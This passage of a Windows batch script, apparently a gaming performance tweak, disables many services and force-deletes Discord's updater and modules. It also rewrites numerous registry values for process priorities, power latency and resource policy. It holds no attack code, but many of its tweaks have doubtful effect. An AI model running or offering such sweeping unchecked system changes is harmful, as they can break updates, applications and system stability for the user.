reg add "HKLM\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WFDSConMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WiaRpc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Winmgmt" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinRM" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WlanSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlidsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlpasvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WManSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wmiApSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WpcMonSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WPDBusEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WwanSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
taskkill /F Discord.exe > NUL 2>&1
echo Removing discord updates/shortcuts
del "%HOMEPATH%\Desktop\Discord.ink" /F /Q
del "%HOMEPATH%\Desktop\Discord.ink - Shortcut" /F /Q
del "%HOMEPATH%\Desktop\Update.exe" /F /Q
del "%HOMEPATH%\Desktop\Update.exe - Shortcut" /F /Q
del "%HOMEPATH%\Desktop\Discord.exe" /F /Q

cls
del "%HOMEPATH%\Desktop\Discord.exe - Shortcut" /F /Q
del "%HOMEPATH%\appdata\Local\discord\Update.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.309\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.308\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.307\Squirrel.exe" /F /Q
del "%HOMEPATH%\appdata\Local\discord\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.309\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.308\SquirrelSetup.log" /F /Q
del "%HOMEPATH%\appdata\Local\discord\app-0.0.307\SquirrelSetup.log" /F /Q
echo removing modules..
rd /s /q "%HOMEPATH%\appdata\Local\discord\Packages"
del "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_modules\397863cd8f\2\discord_game_sdk_x64.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
del "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_modules\397863cd8f\2\discord_game_sdk_x86.dll" /F /Q
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_cloudsync"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_cloudsync"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_cloudsync"
cls
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_dispatch"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_erlpack"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_game_utils"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_krisp"
cls
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_krisp"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_krisp"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_media"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_rpc"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_Spellcheck"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.309\modules\discord_overlay2"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.308\modules\discord_overlay2"
rd /s /q "%HOMEPATH%\appdata\Roaming\discord\0.0.307\modules\discord_overlay2"
echo.
cls
reg add "HKCU\SOFTWARE\NVIDIA Corporation\Global\NVTweak" /v "Gestalt" /t REG_DWORD /d "2" /f
:: unhide SILK smoothness
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\FTS" /v "EnableRID61684" /t REG_DWORD /d "2" /f

cls
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d "2" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
echo Completed
reg add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Energy Logging
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "DisableTaggedEnergyLogging" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxApplication" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxTagPerApplication" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: MMCSS
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Timestamp
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: CSRSS
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: IO Prioritization & Boost
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\I/O System" /v "PassiveIntRealTimeWorkerPriority" /t REG_DWORD /d "18" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\KernelVelocity" /v "DisableFGBoostDecay" /t REG_DWORD /d "1" /f >> APB_Log.txt
cls
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt


cls
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\audiodg.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "2" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\audiodg.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "2" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt


cls
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchIndexer.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrustedInstaller.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuauclt.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: System Responsiveness
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "CapPercentage" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "SchedulingType" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "CapPercentage" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "SchedulingType" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "CapPercentage" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "SchedulingType" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "CapPercentage" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "SchedulingType" /t REG_DWORD /d "0" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\BackgroundDefault" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Frozen" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNCS" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenPPLE" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Paused" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PausedDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Pausing" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PrelaunchForeground" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\ThrottleGPUInterference" /v "IsLowPriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "BasePriority" /t REG_DWORD /d "82" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap" /v "IOBandwidth" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitLimit" /t REG_DWORD /d "4294967295" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitTarget" /t REG_DWORD /d "4294967295" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable MSI Mode for GPU
echo Completed
for /f %%g in ('wmic path win32_videocontroller get PNPDeviceID ^| findstr /L "VEN_"') do (
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%g\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties" /v "MSISupported" /t REG_DWORD /d "1" /f >> APB_Log.txt 
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%g\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
)
timeout /t 1 /nobreak > NUL
cls
:: NVIDIA Latency Tolerance
echo Completed
